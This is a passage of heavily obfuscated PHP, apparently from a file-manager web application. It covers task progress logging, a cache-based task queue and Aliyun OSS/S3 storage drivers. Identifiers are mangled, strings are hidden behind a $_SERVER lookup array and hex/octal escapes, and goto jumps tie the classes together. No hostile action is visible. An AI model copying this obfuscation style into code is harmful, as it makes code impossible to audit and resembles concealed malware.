Cache::remove($ĞÒ´áèİ[$ØÆ’¬İ[475]] . $ØÆ’¬İ[1837]); if ($›ÄæõÙ¦ && file_exists(get_path_father($ñôËü–•))) { Cache::set($ĞÒ´áèİ[$ØÆ’¬İ[475]] . $ØÆ’¬İ[1837], $ñôËü–•); $ĞÒ´áèİ[$ØÆ’¬İ[1794]] = array($ØÆ’¬İ[1838], $ØÆ’¬İ[1839]); } $this->update(0, $›ÄæõÙ¦); } public static function updateCopyLocalFileSize($Šì½ß§§) { $ù›¶• =& $_SERVER[¢ñàß¿€]; $õ¸÷Í÷· = Cache::get($Šì½ß§§[$ù›¶•[475]] . $ù›¶•[1837]); if (!$õ¸÷Í÷· || !file_exists($õ¸÷Í÷·)) { return $Šì½ß§§; } $Šì½ß§§[$ù›¶•[1824]] = @filesize($õ¸÷Í÷·); $Šì½ß§§[$ù›¶•[1828]] += $Šì½ß§§[$ù›¶•[1824]]; self::updateTask($Šì½ß§§); return $Šì½ß§§; } public function copyFileEnd($âÊÛ¯‰š, $ÜÄìµÇÊ, $ÉÒ‡«ÙÆ, $Ü“œ·, $İí¸¤Ä¥, $ãç¬’¾¯) { $àÁÈû =& $_SERVER[¢ñàß¿€]; $æëõ§Î§ =& $this->task; $æëõ§Î§[$àÁÈû[1824]] = $æëõ§Î§[$àÁÈû[1823]]; $æëõ§Î§[$àÁÈû[1825]] = $àÁÈû[12]; unset($æëõ§Î§[$àÁÈû[1794]]); if ($İí¸¤Ä¥ == $æëõ§Î§[$àÁÈû[1821]]) { $æëõ§Î§[$àÁÈû[1827]] += $æëõ§Î§[$àÁÈû[1823]]; $æëõ§Î§[$àÁÈû[1828]] = $æëõ§Î§[$àÁÈû[1827]]; $“Ş‹àÏŒ = 1; if (isset($æëõ§Î§[$àÁÈû[1834]]) && $æëõ§Î§[$àÁÈû[1834]] == $ÜÄìµÇÊ) { $“Ş‹àÏŒ = 0; } $this->update($“Ş‹àÏŒ); } else { $this->update(); $æëõ§Î§[$àÁÈû[1824]] = 0; } Cache::remove($æëõ§Î§[$àÁÈû[475]] . $àÁÈû[1837]); self::log($àÁÈû[1840] . $ÜÄìµÇÊ . $àÁÈû[73] . $Ü“œ· . $àÁÈû[262] . $İí¸¤Ä¥ . $àÁÈû[1841] . $æëõ§Î§[$àÁÈû[1821]]); } public function updateFileEnd($â¢İ×Ë, $³¥ÆîŸ‚) { $«ìÏñş¥ =& $_SERVER[¢ñàß¿€]; $Ä­ÑÌ¦ =& $this->task; $Ä­ÑÌ¦[$«ìÏñş¥[1821]] = $â¢İ×Ë; $Ä­ÑÌ¦[$«ìÏñş¥[1823]] = $³¥ÆîŸ‚; $Ä­ÑÌ¦[$«ìÏñş¥[1827]] += $³¥ÆîŸ‚; $Ä­ÑÌ¦[$«ìÏñş¥[1828]] = $Ä­ÑÌ¦[$«ìÏñş¥[1827]]; $this->update(1); self::log($«ìÏñş¥[1842] . $â¢İ×Ë); } public function sourceModelCopy($Áßßš¶á) { $…”î¡’ø =& $_SERVER[¢ñàß¿€]; $éşõ†Ì = $Áßßš¶á[0]; $³«ø’Ì» = $Áßßš¶á[1]; $áüÎ·ğ· =& $this->task; $this->sourceModelCopyFlag = !0; $¡É½Çõà = 0; switch ($éşõ†Ì) { case $…”î¡’ø[635]: $¡É½Çõà = 1; break; case $…”î¡’ø[638]: $áüÎ·ğ·[$…”î¡’ø[1821]] = $³«ø’Ì»[$…”î¡’ø[32]]; break; case $…”î¡’ø[640]: $¡É½Çõà = intval($Áßßš¶á[$…”î¡’ø[456]] * 0.4); break; case $…”î¡’ø[642]: $¡É½Çõà = intval($Áßßš¶á[$…”î¡’ø[456]] * 0.2); break; case $…”î¡’ø[644]: $¡É½Çõà = intval($Áßßš¶á[$…”î¡’ø[456]] * 0.4); break; } $this->update($¡É½Çõà); $this->sourceModelCopyFlag = !1; } public function sourceRemove($è¶ößò, $‚«»é ï) { $…†ƒŒ£Ç =& $_SERVER[¢ñàß¿€]; $this->sourceModelCopyFlag = !0; $¬ÒĞæ¢ä = 1; if (isset($è¶ößò[$…†ƒŒ£Ç[82]])) { $¬ÒĞæ¢ä = $è¶ößò[$…†ƒŒ£Ç[82]][$…†ƒŒ£Ç[80]]; $¬ÒĞæ¢ä = $¬ÒĞæ¢ä + $è¶ößò[$…†ƒŒ£Ç[82]][$…†ƒŒ£Ç[81]] + 1; } $this->update($¬ÒĞæ¢ä); $this->sourceModelCopyFlag = !1; } public function sourceMove($ó’µß”Û) { $this->sourceRemove($ó’µß”Û, !1); } public function curlProgress($ñıŸ²ô, $ôƒò²¯, $øşÈø–î, $¬¿çØµ÷, $ßà‡ü´Ì) { $Úï·™ =& $_SERVER[¢ñàß¿€]; $Û‡ó–àû =& $this->task; if ($ßà‡ü´Ì > 0) { $Û‡ó–àû[$Úï·™[1140]] = $Úï·™[1843]; $Û‡ó–àû[$Úï·™[1825]] = $Úï·™[110]; if ($Û‡ó–àû[$Úï·™[1823]]) { $Û‡ó–àû[$Úï·™[1824]] = $ßà‡ü´Ì; } if ($Û‡ó–àû[$Úï·™[1826]]) { $Û‡ó–àû[$Úï·™[1824]] = $ßà‡ü´Ì + $Û‡ó–àû[$Úï·™[1826]]; } } else { if ($øşÈø–î > 0) { if ($Û‡ó–àû[$Úï·™[1823]] == $ôƒò²¯) { $Û‡ó–àû[$Úï·™[1824]] = $øşÈø–î; $Û‡ó–àû[$Úï·™[1140]] = $Úï·™[1844]; $Û‡ó–àû[$Úï·™[1825]] = $Úï·™[1276]; } } } $this->update(); } public function curlProgressStart($† „¨™ˆ) { } public function curlProgressEnd($ºñÀ›Ÿ£) { $½çØÈ•İ =& $_SERVER[¢ñàß¿€]; $ÃÀŒ âò =& $this->task; $º»æˆŸ = curl_getinfo($ºñÀ›Ÿ£); $³…Í«öÖ = $º»æˆŸ[$½çØÈ•İ[1845]]; if ($³…Í«öÖ == -1) { $³…Í«öÖ = $º»æˆŸ[$½çØÈ•İ[1846]]; } if ($ÃÀŒ âò[$½çØÈ•İ[1825]] == $½çØÈ•İ[110] && $³…Í«öÖ) { $ÃÀŒ âò[$½çØÈ•İ[1826]] += $³…Í«öÖ; } $this->update(); } } goto CªÀÑÌ÷—ô; CªÀÑÌ÷—ô: class TaskHttp extends Task { protected function startAfter() { $»ÀĞ²Áñ =& $_SERVER[¢ñàß¿€]; $Ï¾û™–™ =& $this->task; $Ï¾û™–™[$»ÀĞ²Áñ[1847]] = 1; Hook::bind($»ÀĞ²Áñ[1815], array($this, $»ÀĞ²Áñ[1848])); Hook::bind($»ÀĞ²Áñ[1817], array($this, $»ÀĞ²Áñ[1849])); Hook::bind($»ÀĞ²Áñ[1819], array($this, $»ÀĞ²Áñ[1850])); } protected function endAfter() { $¶ùğ‘¶† =& $_SERVER[¢ñàß¿€]; Hook::unbind($¶ùğ‘¶†[1815], array($this, $¶ùğ‘¶†[1848])); Hook::unbind($¶ùğ‘¶†[1817], array($this, $¶ùğ‘¶†[1849])); Hook::unbind($¶ùğ‘¶†[1819], array($this, $¶ùğ‘¶†[1850])); } public function progressStart($ê´„µ£) { $ßîş„øÊ =& $_SERVER[¢ñàß¿€]; $ş¬Éî¾µ = curl_getinfo($ê´„µ£); self::log($ßîş„øÊ[1851] . $ş¬Éî¾µ[$ßîş„øÊ[383]]); self::valueSet($this->task[$ßîş„øÊ[475]], $this->task); } public function progressEnd($ÛÀ¶†®š) { $Ô–è‰ôû =& $_SERVER[¢ñàß¿€]; self::log($Ô–è‰ôû[1852] . $this->task[$Ô–è‰ôû[475]]); $this->end(); } public function progress($ ¡Âƒ±ö, $‘ªØ€å, $¨ÜøÃª«, $›Ã´ó¹ª, $ş¿øë ú) { $ë÷ùÛëÅ =& $_SERVER[¢ñàß¿€]; $š§úË =& $this->task; if ($ş¿øë ú > 0) { $š§úË[$ë÷ùÛëÅ[1138]] = $š§úË[$ë÷ùÛëÅ[1138]] == 0 ? $›Ã´ó¹ª : $š§úË[$ë÷ùÛëÅ[1138]]; $š§úË[$ë÷ùÛëÅ[1771]] = $ş¿øë ú; } else { if ($¨ÜøÃª« > 0) { $š§úË[$ë÷ùÛëÅ[1138]] = $š§úË[$ë÷ùÛëÅ[1138]] == 0 ? $‘ªØ€å : $š§úË[$ë÷ùÛëÅ[1138]]; $š§úË[$ë÷ùÛëÅ[1771]] = $¨ÜøÃª«; } } $this->update(); self::log("\160\162\x6f\147\x72\145\163\163\x48\x74\164\160\72\144\x6f\x77\x6e\72{$¨ÜøÃª«}\57{$‘ªØ€å}\x3b\40\x75\x70\154\x6f\x61\144\72{$ş¿øë ú}\x2f{$›Ã´ó¹ª}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($÷ù»»´›, $öòùõÖ… = '', $µÄêàØÏ = 0, $…ÇšÆ¨— = '') { $áöÁ¾í =& $_SERVER[¢ñàß¿€]; $…ÇšÆ¨— = $…ÇšÆ¨— ? $…ÇšÆ¨— : ($öòùõÖ… ? $öòùõÖ… : $÷ù»»´›); $ø€„²ÇÎ = new Task($÷ù»»´›, $öòùõÖ…, $µÄêàØÏ, $…ÇšÆ¨—); $GLOBALS[$áöÁ¾í[1853] . $÷ù»»´›] = new TaskLog($áöÁ¾í[1754], $ø€„²ÇÎ, $…ÇšÆ¨—); return $ø€„²ÇÎ; } public function __construct($êÉòı©Ç = '', $“óŞä¸¸ = '', $¥Éáêáä = '') { $˜•é½Ö£ =& $_SERVER[¢ñàß¿€]; if (!$êÉòı©Ç) { $êÉòı©Ç = $˜•é½Ö£[1754]; } $õğ¬¿…§ = $êÉòı©Ç . $˜•é½Ö£[462] . rand_string(10); if (!$¥Éáêáä) { $¥Éáêáä = $êÉòı©Ç . $˜•é½Ö£[53] . $¥Éáêáä; } switch ($êÉòı©Ç) { case $˜•é½Ö£[1754]: if (!$“óŞä¸¸ || !$“óŞä¸¸->task) { return echoLog($êÉòı©Ç . $˜•é½Ö£[1854]); } $ÁÛƒşçÉ = $“óŞä¸¸; $õğ¬¿…§ = $ÁÛƒşçÉ->task[$˜•é½Ö£[475]]; $êÉòı©Ç = $ÁÛƒşçÉ->task[$˜•é½Ö£[475]]; if (!$ÁÛƒşçÉ->task[$˜•é½Ö£[1659]]) { $ÁÛƒşçÉ->task[$˜•é½Ö£[1659]] = $¥Éáêáä ? $¥Éáêáä : $êÉòı©Ç; } break; case $˜•é½Ö£[1855]: if (!$“óŞä¸¸) { return echoLog($êÉòı©Ç . $˜•é½Ö£[1856]); } $±Ä®Õõ¦ = is_string($“óŞä¸¸) ? array($“óŞä¸¸) : $“óŞä¸¸; $ÁÛƒşçÉ = new TaskFileTransfer($õğ¬¿…§, $êÉòı©Ç, 0, $¥Éáêáä ? $¥Éáêáä : $±Ä®Õõ¦[0]); foreach ($±Ä®Õõ¦ as $áÚøüéæ) { $ÁÛƒşçÉ->addPath($áÚøüéæ); } break; case $˜•é½Ö£[389]: if (!$“óŞä¸¸) { return echoLog($êÉòı©Ç . $˜•é½Ö£[1856]); } $±Ä®Õõ¦ = is_string($“óŞä¸¸) ? array($“óŞä¸¸) : $“óŞä¸¸; $ÁÛƒşçÉ = new TaskZip($õğ¬¿…§, $êÉòı©Ç, 0, $¥Éáêáä ? $¥Éáêáä : $±Ä®Õõ¦[0]); foreach ($±Ä®Õõ¦ as $áÚøüéæ) { $ÁÛƒşçÉ->addPath($áÚøüéæ); } break; case $˜•é½Ö£[1296]: if (!$“óŞä¸¸) { return echoLog($êÉòı©Ç . $˜•é½Ö£[1856]); } $ÁÛƒşçÉ = new TaskUnZip($õğ¬¿…§, $êÉòı©Ç, 0, $¥Éáêáä ? $¥Éáêáä : $“óŞä¸¸); if ($“óŞä¸¸) { $ÁÛƒşçÉ->addFile($“óŞä¸¸); } break; case $˜•é½Ö£[152]: $ÁÛƒşçÉ = new TaskHttp($õğ¬¿…§, $êÉòı©Ç); break; default: return; break; } $this->task = $ÁÛƒşçÉ; $this->taskID = $õğ¬¿…§; Hook::bind($˜•é½Ö£[1791], array($this, $˜•é½Ö£[1857])); Hook::bind($˜•é½Ö£[1793], array($this, $˜•é½Ö£[1858])); Hook::bind($˜•é½Ö£[1787], array($this, $˜•é½Ö£[1859])); echoLog($˜•é½Ö£[1860] . $ÁÛƒşçÉ->task[$˜•é½Ö£[1659]]); } public function __destruct() { $this->end(); } public function end($šİšÕ¹ = '') { $Ãï‚œ–Ê =& $_SERVER[¢ñàß¿€]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($šİšÕ¹); $this->task = !1; $this->taskID = !1; Hook::unbind($Ãï‚œ–Ê[1791], array($this, $Ãï‚œ–Ê[1857])); Hook::unbind($Ãï‚œ–Ê[1793], array($this, $Ãï‚œ–Ê[1858])); Hook::unbind($Ãï‚œ–Ê[1787], array($this, $Ãï‚œ–Ê[1859])); } public function taskUpdate($†ùßÅÔæ) { $…Ñ´ı£Ü =& $_SERVER[¢ñàß¿€]; if (!$†ùßÅÔæ || $this->taskID != $†ùßÅÔæ[$…Ñ´ı£Ü[475]]) { return; } $üø³È²Ü = 20; $¬ÁÖ¹¬Ş = intval($†ùßÅÔæ[$…Ñ´ı£Ü[1772]] * $üø³È²Ü); $ö‘­Œ‡ = $…Ñ´ı£Ü[176] . str_repeat($…Ñ´ı£Ü[959], $¬ÁÖ¹¬Ş) . $…Ñ´ı£Ü[1089] . str_repeat($…Ñ´ı£Ü[53], $üø³È²Ü - $¬ÁÖ¹¬Ş) . $…Ñ´ı£Ü[178]; $Î“í–¯ğ = $ö‘­Œ‡ . sprintf($…Ñ´ı£Ü[1861], $†ùßÅÔæ[$…Ñ´ı£Ü[1772]] * 100) . $…Ñ´ı£Ü[1862]; $¬ƒŸ»­ = $Î“í–¯ğ . $†ùßÅÔæ[$…Ñ´ı£Ü[1771]] . $…Ñ´ı£Ü[8] . $†ùßÅÔæ[$…Ñ´ı£Ü[1138]] . LNG($…Ñ´ı£Ü[1863]); $²äÁ¬¨õ = $…Ñ´ı£Ü[12]; if ($†ùßÅÔæ[$…Ñ´ı£Ü[1847]]) { $¬ƒŸ»­ = $Î“í–¯ğ . size_format($†ùßÅÔæ[$…Ñ´ı£Ü[1771]]) . $…Ñ´ı£Ü[8] . size_format($†ùßÅÔæ[$…Ñ´ı£Ü[1138]]); $²äÁ¬¨õ = size_format($†ùßÅÔæ[$…Ñ´ı£Ü[1773]]) . $…Ñ´ı£Ü[1864]; } if ($†ùßÅÔæ[$…Ñ´ı£Ü[1140]]) { $†ùßÅÔæ[$…Ñ´ı£Ü[1821]] = $†ùßÅÔæ[$…Ñ´ı£Ü[1140]] . $…Ñ´ı£Ü[53] . $†ùßÅÔæ[$…Ñ´ı£Ü[1821]]; } if ($†ùßÅÔæ[$…Ñ´ı£Ü[1821]]) { $„Ó³È† = $…Ñ´ı£Ü[12]; if ($†ùßÅÔæ[$…Ñ´ı£Ü[1823]]) { $„Ó³È† = $…Ñ´ı£Ü[50] . size_format($†ùßÅÔæ[$…Ñ´ı£Ü[1824]]) . $…Ñ´ı£Ü[8] . size_format($†ùßÅÔæ[$…Ñ´ı£Ü[1823]]); } $²äÁ¬¨õ .= $†ùßÅÔæ[$…Ñ´ı£Ü[1821]] . $„Ó³È†; } if ($†ùßÅÔæ[$…Ñ´ı£Ü[834]] && !$†ùßÅÔæ[$…Ñ´ı£Ü[1823]]) { $²äÁ¬¨õ .= $…Ñ´ı£Ü[53] . size_format($†ùßÅÔæ[$…Ñ´ı£Ü[1828]]) . $…Ñ´ı£Ü[8] . size_format($†ùßÅÔæ[$…Ñ´ı£Ü[834]]); } echoLog($¬ƒŸ»­ . $…Ñ´ı£Ü[53] . $²äÁ¬¨õ, !0); } public function taskEnd($š§¾“œî) { $áİå¼Ô‡ =& $_SERVER[¢ñàß¿€]; if (!$š§¾“œî || $this->taskID != $š§¾“œî[$áİå¼Ô‡[475]]) { return; } $Œ£Ìçœ = $š§¾“œî ? $š§¾“œî[$áİå¼Ô‡[1771]] . $áİå¼Ô‡[8] . $š§¾“œî[$áİå¼Ô‡[1138]] . LNG($áİå¼Ô‡[1863]) . $áİå¼Ô‡[74] : $áİå¼Ô‡[12]; echoLog($áİå¼Ô‡[1865] . $š§¾“œî[$áİå¼Ô‡[1659]] . ($š§¾“œî[$áİå¼Ô‡[526]] ? $áİå¼Ô‡[74] . $š§¾“œî[$áİå¼Ô‡[526]] : $áİå¼Ô‡[12]) . $áİå¼Ô‡[74] . $Œ£Ìçœ . $áİå¼Ô‡[1866] . sprintf($áİå¼Ô‡[921], timeFloat() - $š§¾“œî[$áİå¼Ô‡[1774]]) . $áİå¼Ô‡[1786]); $this->end(); } public function taskKill($‘ëÄà¤) { $—Ô¼ùÌî =& $_SERVER[¢ñàß¿€]; if (!$‘ëÄà¤ || $this->taskID != $‘ëÄà¤[$—Ô¼ùÌî[475]]) { return; } echoLog($—Ô¼ùÌî[1867] . $‘ëÄà¤[$—Ô¼ùÌî[1659]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\x65\165\145\114\145\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\x61\163\x6b\121\165\x65\x75\145\104\141\x74\141"; const QUEUE_TIME = "\164\141\x73\x6b\x51\165\145\165\145\x4c\141\x73\x74\x52\x75\156"; const QUEUE_THREAD = "\x74\141\163\153\x51\165\x65\165\145\x54\x68\x72\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($æ×¼Ğ, $÷èŸĞ”Ú = array(), $Ş‹ĞÛæî = '', $™Í‰Ëø© = '') { $…³ñîŸ» =& $_SERVER[¢ñàß¿€]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($™Í‰Ëø© && array_find_by_field(self::$listData, $…³ñîŸ»[97], $™Í‰Ëø©)) { return !0; } if ($™Í‰Ëø© && array_find_by_field(self::$listDataAdd, $…³ñîŸ»[97], $™Í‰Ëø©)) { return !0; } self::$listDataAdd[] = array($…³ñîŸ»[341] => $æ×¼Ğ, $…³ñîŸ»[1868] => $÷èŸĞ”Ú, $…³ñîŸ»[526] => $Ş‹ĞÛæî, $…³ñîŸ»[97] => $™Í‰Ëø©); return !0; } public static function addSubmit() { $¹™˜ï¡¨ =& $_SERVER[¢ñàß¿€]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¹™˜ï¡¨[1869] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¹™˜ï¡¨[12], $¹™˜ï¡¨[526])), $¹™˜ï¡¨[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¬üâ¼¾±, $»¢Œ¾Œí = array(), $¥ß±òÆĞ = '', $ùö¤Ñğ‡ = '') { $»‚æÕ› =& $_SERVER[¢ñàß¿€]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Šî±Õ¾æ = self::getAll(); if ($ùö¤Ñğ‡ && array_find_by_field($Šî±Õ¾æ, $»‚æÕ›[97], $ùö¤Ñğ‡)) { return !0; } $Šî±Õ¾æ[] = array($»‚æÕ›[341] => $¬üâ¼¾±, $»‚æÕ›[1868] => $»¢Œ¾Œí, $»‚æÕ›[526] => $¥ß±òÆĞ, $»‚æÕ›[97] => $ùö¤Ñğ‡); self::setAll($Šî±Õ¾æ); write_log($»‚æÕ›[1869] . $¥ß±òÆĞ, $»‚æÕ›[197]); return !0; } public static function run() { $ü”ºÇòí =& $_SERVER[¢ñàß¿€]; $‘¥ï¬éÍ = self::getAll(); $Üí•èã¢ = array_shift($‘¥ï¬éÍ); if (!$Üí•èã¢) { return !1; } self::setAll($‘¥ï¬éÍ); $œŠŒŞá = timeFloat(); $¢×Õ®Åõ = $ü”ºÇòí[12]; try { $¢×Õ®Åõ = Hook::apply($Üí•èã¢[$ü”ºÇòí[341]], $Üí•èã¢[$ü”ºÇòí[1868]]); } catch (Exception $ä¿øŸì) { write_log($ä¿øŸì, $ü”ºÇòí[1261]); } $¥¡¬”• = number_format(timeFloat() - $œŠŒŞá, 3) . $ü”ºÇòí[1786]; if ($¢×Õ®Åõ && is_string($¢×Õ®Åõ)) { $¥¡¬”• = $¥¡¬”• . $ü”ºÇòí[1870] . $¢×Õ®Åõ; } write_log($ü”ºÇòí[1871] . $Üí•èã¢[$ü”ºÇòí[526]] . $ü”ºÇòí[1872] . $¥¡¬”•, $ü”ºÇòí[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $àå”š– =& $_SERVER[¢ñàß¿€]; $‚æÖŒÍÕ = self::threadCount() + 1; if ($‚æÖŒÍÕ > 3 || !self::count()) { return; } write_log($àå”š–[1873] . $‚æÖŒÍÕ, $àå”š–[197]); Cache::set(self::QUEUE_THREAD, $‚æÖŒÍÕ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($àå”š–[1874], $àå”š–[197]); } public static function getKey($Š¿»×Üı, $ˆ«×´§¹ = "\151\156\164") { $¿‚ªÚÖ =& $_SERVER[¢ñàß¿€]; Cache::removeMemory($Š¿»×Üı); $—¬â·× = Cache::get($Š¿»×Üı); if ($ˆ«×´§¹ == $¿‚ªÚÖ[364]) { return $—¬â·× ? intval($—¬â·×) : 0; } if ($ˆ«×´§¹ == $¿‚ªÚÖ[1875]) { return is_array($—¬â·×) ? $—¬â·× : array(); } return $—¬â·×; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¢ñàß¿€][1875]); } public static function setAll($å¹Ê¬º‹) { $ê•áÒÏ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($å¹Ê¬º‹), $ê•áÒÏ); Cache::set(self::QUEUE_DATA, $å¹Ê¬º‹, $ê•áÒÏ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto AÛáïŒ³¤; b¾íİ³¢: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ŠÃÒŠ©) { parent::__construct($ŠÃÒŠ©); $this->setSignVersion($_SERVER[¢ñàß¿€][247]); } public function fileOutLink($îíâœ…) { $à•³ç…Ç =& $_SERVER[¢ñàß¿€]; if (substr($îíâœ…, 0, 7) == $à•³ç…Ç[313]) { $îíâœ… = $à•³ç…Ç[314] . substr($îíâœ…, 7); } header($à•³ç…Ç[175] . $îíâœ…); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ã½¼Õ’) { parent::__construct(); include_once SDK_DIR . $_SERVER[¢ñàß¿€][1459]; $this->_init($ã½¼Õ’); } public function _init($×ãœÇ‡¸) { $ĞêŒÂ½ó =& $_SERVER[¢ñàß¿€]; $this->config = $×ãœÇ‡¸; foreach ($×ãœÇ‡¸ as $¿…£±¹¼ => $’İ©ÁÂ¤) { if (isset($this->{$¿…£±¹¼})) { $this->{$¿…£±¹¼} = $’İ©ÁÂ¤; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ĞêŒÂ½ó[1460] . LNG($ĞêŒÂ½ó[1461])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $şåò¢ =& $_SERVER[¢ñàß¿€]; $‚äğˆ©º = new OSS\Model\CorsConfig(); $û À± = new OSS\Model\CorsRule(); $û À±->addAllowedOrigin($şåò¢[1462]); $û À±->addAllowedMethod($şåò¢[1463]); $û À±->addAllowedMethod($şåò¢[1464]); $û À±->addAllowedMethod($şåò¢[1465]); $û À±->addAllowedMethod($şåò¢[1466]); $û À±->addAllowedMethod($şåò¢[165]); $û À±->setMaxAgeSeconds(600); $û À±->addExposeHeader($şåò¢[1467]); $û À±->addAllowedHeader($şåò¢[1462]); $‚äğˆ©º->addRule($û À±); try { $this->client->putBucketCors($this->bucket, $‚äğˆ©º); } catch (OSS\Core\OssException $¸ìü‹ÔÑ) { $this->writeLog(__FUNCTION__ . $şåò¢[214] . $¸ìü‹ÔÑ->getMessage()); return !1; } return !0; } public function getBucketCors() { $½·„ŸÊî =& $_SERVER[¢ñàß¿€]; $±¥¾·â = null; try { $±¥¾·â = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $á½û³Û¯) { $this->writeLog(__FUNCTION__ . $½·„ŸÊî[214] . $á½û³Û¯->getMessage()); return null; } if (!$±¥¾·â || !($ ½°ËåÕ = $±¥¾·â->getRules())) { return null; } $Û¹ÈÛ¤„ = $ ½°ËåÕ[0]->getAllowedOrigins(); $’™÷Üğö = $ ½°ËåÕ[0]->getAllowedMethods(); $ÔÀô´øİ = $ ½°ËåÕ[0]->getMaxAgeSeconds(); $²Ø‰¶µ¡ = $ ½°ËåÕ[0]->getExposeHeaders(); $§†Õ¾ŞÆ = $ ½°ËåÕ[0]->getAllowedHeaders(); return array($½·„ŸÊî[218] => isset($Û¹ÈÛ¤„[0]) ? $Û¹ÈÛ¤„[0] : $½·„ŸÊî[12], $½·„ŸÊî[222] => $’™÷Üğö, $½·„ŸÊî[1468] => $ÔÀô´øİ, $½·„ŸÊî[1469] => isset($²Ø‰¶µ¡[0]) ? $²Ø‰¶µ¡[0] : $½·„ŸÊî[12], $½·„ŸÊî[219] => isset($§†Õ¾ŞÆ[0]) ? $§†Õ¾ŞÆ[0] : $½·„ŸÊî[12]); } public function isBucketCors() { $ëÆèĞò =& $_SERVER[¢ñàß¿€]; $«‹Š±‡Æ = $this->getBucketCors(); if (!$«‹Š±‡Æ || !is_array($«‹Š±‡Æ)) { return !1; } if ($«‹Š±‡Æ[$ëÆèĞò[218]] != $ëÆèĞò[220] || $«‹Š±‡Æ[$ëÆèĞò[219]] != $ëÆèĞò[220]) { return !1; } $ÎÏ¹¦ĞÍ = array_map($ëÆèĞò[221], $«‹Š±‡Æ[$ëÆèĞò[222]]); if (!is_array($ÎÏ¹¦ĞÍ)) { $ÎÏ¹¦ĞÍ = array(); } $Øıó¹¹¯ = array($ëÆèĞò[223], $ëÆèĞò[224], $ëÆèĞò[225], $ëÆèĞò[226], $ëÆèĞò[227]); $ƒÙå¬èã = array_diff($Øıó¹¹¯, $ÎÏ¹¦ĞÍ); return empty($ƒÙå¬èã); } public function mkfile($ …ğÍ¼ê, $á¤ñÖå = '', $Ôç÷¥æû = REPEAT_RENAME) { $ûé¾ŞÅ§ = $this->setContent($ …ğÍ¼ê, $á¤ñÖå); if ($ûé¾ŞÅ§ !== !1) { return $this->getPathOuter($ …ğÍ¼ê); } return !1; } public function mkdir($úĞû¤¾«, $ÂËé£àº = REPEAT_SKIP) { if ($ÂËé£àº && $this->_isFolder($úĞû¤¾«)) { return $this->getPathOuter($úĞû¤¾«); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($úĞû¤¾«)); } catch (OSS\Core\OssException $¤»›®˜) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][214] . $¤»›®˜->getMessage()); return !1; } return $this->getPathOuter($úĞû¤¾«); } private function fileList($°×¤ı¬Š, $½±ĞİÎ = '', $ı²ãíéÓ = 0) { $…ÌşñÒÒ =& $_SERVER[¢ñàß¿€]; $°×¤ı¬Š = trim($°×¤ı¬Š, $…ÌşñÒÒ[8]); $ªùëé›È = empty($°×¤ı¬Š) && $°×¤ı¬Š !== $…ÌşñÒÒ[228] ? $…ÌşñÒÒ[12] : $°×¤ı¬Š . $…ÌşñÒÒ[8]; $ë”õÖ—Ç = $…ÌşñÒÒ[12]; $ µ´‡ö = 1000; $õ°µ‡› = $Œïİ›åá = array(); while (!0) { check_abort(); $ú¹…¡©Ù = array($…ÌşñÒÒ[1470] => $½±ĞİÎ, $…ÌşñÒÒ[1471] => $ªùëé›È, $…ÌşñÒÒ[1472] => $ µ´‡ö, $…ÌşñÒÒ[1473] => $ë”õÖ—Ç); try { $ÇÇú‘¹ = $this->client->listObjects($this->bucket, $ú¹…¡©Ù); } catch (OSS\Core\OssException $Èµ±÷¾±) { $this->writeLog(__FUNCTION__ . $…ÌşñÒÒ[214] . $Èµ±÷¾±->getMessage()); break; } $ë”õÖ—Ç = $ÇÇú‘¹->getNextMarker(); $²­Ï®õÜ = $ÇÇú‘¹->getObjectList(); $Ìı¹€÷ = $ÇÇú‘¹->getPrefixList(); foreach ($²­Ï®õÜ as $–³£ó¼ã) { if ($–³£ó¼ã->getKey() == $ªùëé›È) { continue; } $õì›¦’ò = $–³£ó¼ã->getKey(); $ïøíåœá = $–³£ó¼ã->getSize(); $ØñÜÖøÃ = $–³£ó¼ã->getLastModified(); $ŠÆ«ÅÈ› = trim($–³£ó¼ã->getETag(), $…ÌşñÒÒ[121]); $°ñ˜Ü = $ı²ãíéÓ ? array($…ÌşñÒÒ[32] => $õì›¦’ò, $…ÌşñÒÒ[79] => $ïøíåœá, $…ÌşñÒÒ[206] => strtotime($ØñÜÖøÃ), $…ÌşñÒÒ[1474] => $ŠÆ«ÅÈ›) : $õì›¦’ò; $ŒšÈßØ² = $ïøíåœá == 0 && substr($õì›¦’ò, strlen($õì›¦’ò) - 1, 1) == 